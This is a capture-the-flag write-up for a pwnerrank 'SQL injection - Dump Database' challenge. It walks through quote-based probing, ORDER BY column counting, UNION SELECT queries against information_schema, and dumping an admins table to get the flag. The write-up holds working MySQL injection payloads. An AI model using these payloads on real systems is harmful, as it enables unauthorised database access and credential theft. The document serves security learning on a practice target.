#Writeups for pwnerrank challenges

##SQL injection - Dump Database https://www.pwnerrank.com/tasks/sql-injection-dump-database

Side note: This challenge took somewhere around 2 hours to solve, I was not familiar with many of the SQLi techniques required to solve this challenge but knew where to look to learn.
To anyone learning and stuck just Try Harder! SQL injection cheat sheets are you friend, pay attention to details in the syntax! Before 'cheating' look up some of the talk by Joe McCray on SQL injection (Defcon 17 talk will help with this challenge). Incredibly valuable stuff and really fun to watch.  He explains his thought process going through SQLi.  (Keep in mind his Defcon17 talk uses MS SQL not MySQL so there will be syntax differences)

"DEF CON 17 - Joseph McCray - Advanced SQL Injection"
https://www.youtube.com/watch?v=-AkUutmXwUI


###Objective
Steal the admin password

###Verifying SQL Injection
First step was to learn how the web application works, then try to verify SQL injection.  The page features a single text form that is used to search the small database.  The text form searches the "Book" and "Author" fields but not the "Price field".

On to SQL injection. I tried the following basic SQL injections too see if I could learn some information about what database backend was in use.

```a'or 1=1
a" or 1=1
a' or '1'='1
a" or '1'='1
```

The following next injection I tried `a' or '1'='1'` generated a MySQL Syntax error:
```DB Error, could not query the database MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'='1'%'' at line 1```


Time to add a MySQL comment `#` or `-- ` to the end and see if it works. `a' or '1'='1'#` Success! No error is generated, and all the contents are displayed.
![pic1]
[pic1]: https://raw.githubusercontent.com/Freakazoidile/ctf_challenges/master/pwnerrank/Web%20Exploitation/sql-injection-dump-database-1.png

The fact that all the records are shown and no error is generated indicates `or 1=1` was executed.

###SQL Query
Now that SQL injection is verified and I know the database backend in use, MySQL.  Now I can create what I think is the SQL query in use to build on and understand how more queries will work.

Combining the knowledge of the application functionality (searching the Book and the Author field) the SQL query probably looks something like:
`SELECT book, author, price from books where book like '$userinput' or author like '$userinput';`

###Determining Amount of Columns and Collection More Information
The next step is to determine the amount of fields and gather some general information like the MySQL version or the user running the database.

The database has atleast 3 columns. So using `ORDER BY` we can being enumuration. First lets verify the `ORDER BY` query will work.

```' order by 1#```

Great it works, let's see how many columns there is.

```' order by 3#```
3 columns, works as expected.

```' order by 4#```
4 columns, no errors yet.

```' order by 5#```
ERROR! Number of columns in the current table is 4.


Moving forward it's time to check to see what columns are being printed to the screen.

```' or 1=1 union all select 1,2,3,4#```

The above query outputs:
![pic2]
[pic2]: https://raw.githubusercontent.com/Freakazoidile/ctf_challenges/master/pwnerrank/Web%20Exploitation/sql-injection-dump-database-2.png


So the paramters 2, 3 and 4 get printed to screen, so we can change these to database columns and gather information from.

First check for the MySQL version and user.

```' or 1=1 union all select 1,version(),user(),4#```

![pic3]
[pic3]: https://raw.githubusercontent.com/Freakazoidile/ctf_challenges/master/pwnerrank/Web%20Exploitation/sql-injection-dump-database-3.png
As can be seen version 5.5.53 of MySQL is likely in use and what looks like a debian operating system 'deb' version 8u1? Searching `5.5.53-0+deb8u1` on Google reveals this is correct.


###Getting the flag!
Now that we can use SQL union queries to get information we can find the admin password.  First step is to find the right table. Time to use the `information_schema` table (hopefully we have access to read it) to see what other tables and columns exist.

```' or 1=1 union all select 1,table_name,3,4 from information_schema.tables#```
This reveals alot of tables, 42 to be exact. The last two tables are `admin` and `books`. Lets see what columns are in the `admin` table.

```' or 1=1 union all select 1,column_name,3,4 from information_schema.columns where table_name like 'admins'#```

Results show the following columns are present in the admin table: `id`, `username`, `password`, `email`.
The goal is to get the `admin` password, lets try and dump the passwords from the admin table.

```' or 1=1 union all select 1, username, 3, 4 from admins#```

Success, the flag has been claimed! Looks like there is only one entry in the admins database. 

`pwnerrank{t0mcaTTacm0t}`






